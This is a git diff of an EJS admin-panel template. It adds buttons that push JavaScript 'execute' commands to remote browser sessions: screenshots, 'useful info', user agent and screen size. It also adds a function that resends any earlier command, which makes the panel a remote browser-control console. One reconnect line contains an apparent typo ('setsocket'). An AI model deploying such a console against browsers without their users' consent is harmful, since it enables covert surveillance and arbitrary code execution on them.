@@ -17,10 +17,11 @@
     <%- include('partials/sidebar') %>
     <div class="flex-1 flex bg-indigo-100">
       <div class="flex-1 flex flex-col p-4 overflow-auto">
-        <h1 class="h-[72px] bg-white text-4xl p-4 text-center mb-4">[<%= session.id %>] [<%= session.name %> - <%= session.sessionId %>]</h1>
+        <h1 id="title" class="h-[72px] text-4xl p-4 text-center mb-4 bg-green-500">[<%= session.id %>] [<%= session.name %> - <%=
+                    session.sessionId %>]</h1>
         <div class="flex w-full flex-wrap gap-4 flex-1">
-          <div class="flex flex-1 basis-1/3 flex-col gap-2" id="messages">
-            <% locals.messages?.forEach(msg => { %>
+          <div class="flex flex-1 basis-1/2 flex-col gap-2" id="messages">
+            <% locals.messages?.forEach(msg=> { %>
             <%- include('partials/message', {msg}) %>
             <% }) %>
             <% if (!locals.messages?.length) {%>
@@ -42,16 +43,22 @@
             <div class="flex flex-col">
               <div class="flex-1 bg-white p-4 m-2 flex flex-col">
                 <h2 class="text-xl">Session Info</h2>
-                <p>Id: <%= session.id %></p>
-                <p>Session ID: <%= session.sessionId %></p>
-                <p>Script ID: <%= session.scriptId %></p>
-                <p>Status: <%= session.status %></p>
+                <p>Id: <%= session.id %>
+                </p>
+                <p>Session ID: <%= session.sessionId %>
+                </p>
+                <p>Script ID: <%= session.scriptId %>
+                </p>
+                <p>Status: <%= session.status %>
+                </p>
               </div>
               <div class="flex flex-col">
                 <h2 class="text-xl">Commands</h2>
-                <div class="flex flex-row">
-                  <button class="bg-blue-500 text-white p-2 m-2">Start</button>
-                  <button class="bg-red-500 text-white p-2 m-2">Stop</button>
+                <div class="flex flex-col">
+                  <button class="bg-green-300 text-black p-2 m-2" onclick="doAnAction('screenshoot')">Take a screenshoot</button>
+                  <button class="bg-green-300 text-black p-2 m-2" onclick="doAnAction('usefulInfo')">Get useful informations</button>
+                  <button class="bg-green-300 text-black p-2 m-2" onclick="doAnAction('getUa')">Get UA</button>
+                  <button class="bg-green-300 text-black p-2 m-2" onclick="doAnAction('getScreenSize')">Get screen size</button>
                 </div>
               </div>
             </div>
@@ -61,7 +68,7 @@
     </div>
   </div>
   <script src="/socket.io/socket.io.js"></script>
-  <% if (session.status === "Active") { %>
+  <% if (session.status==="Active" ) { %>
   <script>
     const messages = document.querySelector("#messages");
     const msgLastChild = document.querySelector("#messages-end");
@@ -70,6 +77,9 @@
       sessionId: "<%= session.sessionId %>",
     };
 
+    let reconnectInterval = null;
+    const title = document.querySelector("#title");
+
     socket.on("connect", handleConnectEvent);
     socket.on('disconnect', handleDisconnectEvent);
     socket.on('session:closed', handleClosedSessionEvent);
@@ -77,16 +87,23 @@
 
     function handleConnectEvent() {
       console.log("Connected to the server");
+      clearTimeout(reconnectInterval);
       socket.emit("admin:join", {
         id: state.sessionId,
       });
+      title.classList.add("bg-green-500");
+      title.classList.remove("bg-red-500");
     }
 
     function handleDisconnectEvent() {
       console.log("Disconnected from the server");
-      if (window.confirm("You have been disconnected from the server. Do you want to reload?")) {
-        window.location.reload();
-      }
+
+      clearInterval(reconnectInterval);
+      reconnectInterval = setInterval(() => {
+        setsocket.connect();
+      }, 1000);
+      title.classList.add("bg-red-500");
+      title.classList.remove("bg-green-500");
     }
 
     function handleMessageFormSubmit(event) {
@@ -112,6 +129,68 @@
       const el = new DOMParser().parseFromString(data, "text/html").body.firstChild;
       messages.insertBefore(el, msgLastChild);
       setTimeout(() => document.querySelector('#messages')?.scrollTo(0, 1e6), 100);
+      window.cropToLongMessages();
+    }
+
+    function copyCommand(el) {
+      const content = el.closest('[data-content]').getAttribute('data-content');
+      window.navigator.clipboard.writeText(content);
+      el.style.filter = "brightness(0.5)";
+      setTimeout(() => {
+        el.style.filter = null;
+      }, 1000);
+    }
+
+    function resendCommand(el) {
+      const content = el.closest('[data-content]').getAttribute('data-content');
+      if (!content) return;
+      socket.emit("admin:command", {
+        id: state.sessionId,
+        message: {
+          type: "execute",
+          payload: content,
+        }
+      });
+    }
+
+    function doAnAction(type) {
+      const NYI = "NOT YET IMPLEMENTED";
+      if(type === 'screenshoot') {
+        socket.emit("admin:command", {
+          id: state.sessionId,
+          message: {
+            type: "take-screenshoot",
+            payload: "return html2canvas(document.body).then(c => c.toDataURL())"
+          }
+        });
+      }
+      if(type === 'usefulInfo'){
+        socket.emit("admin:command", {
+          id: state.sessionId,
+          message: {
+            type: "execute",
+            payload: "return window.getUsefulInfo()",
+          }
+        });
+      }
+      if(type === 'getUa') {
+        socket.emit("admin:command", {
+          id: state.sessionId,
+          message: {
+            type: "execute",
+            payload: "return navigator.userAgent",
+          }
+        });
+      }
+      if(type === 'getScreenSize') {
+        socket.emit("admin:command", {
+          id: state.sessionId,
+          message: {
+            type: "execute",
+            payload: `return { docW: window.innerWidth,\ndocH: window.innerHeight,\nscrollW: window.scrollX,\nscrollH: window.scrollY,\nscreenW: window.outerWidth,\nscreenH: window.outerHeight}`,
+          }
+        });
+      }
     }
   </script>
   <% } %>
@@ -124,9 +203,9 @@
     document.querySelector('#messages')?.scrollTo(0, 1e6);
 
     const messageId = new URLSearchParams(window.location.search).get('messageId');
-    if(messageId) {
+    if (messageId) {
       const el = document.querySelector(`[data-id="${messageId}"]`)
-      if(el) {
+      if (el) {
         el.scrollIntoView();
         el.style.filter = "brightness(2)"
         setTimeout(() => {
@@ -134,6 +213,36 @@
         }, 2000);
       }
     }
+
+    window.cropToLongMessages = function () {
+      document.querySelectorAll('#messages pre:not(.hidden[data-completed-crop])').forEach(item => {
+        const code = item.querySelector('code');
+        if (code.offsetHeight > 200) {
+          item.style.position = "relative";
+          code.style.height = "150px";
+          code.style.overflow = "auto";
+          code.style.display = 'inline-block';
+          const btn = document.createElement('button');
+          btn.innerText = "Show more";
+          btn.style.position = "absolute";
+          btn.style.bottom = "0";
+          btn.style.right = "0";
+          btn.style.backgroundColor = "rgba(255,255,255,0.5)";
+          btn.style.border = "1px solid #000";
+          btn.style.padding = "4px";
+          btn.style.cursor = "pointer";
+          btn.onclick = () => {
+            code.style.height = "auto";
+            btn.remove();
+          }
+          item.appendChild(btn);
+        }
+        item.setAttribute('data-completed-crop', 'true');
+      });
+    }
+    setTimeout(() => {
+      window.cropToLongMessages();
+    }, 1000);
   </script>
 </body>
 
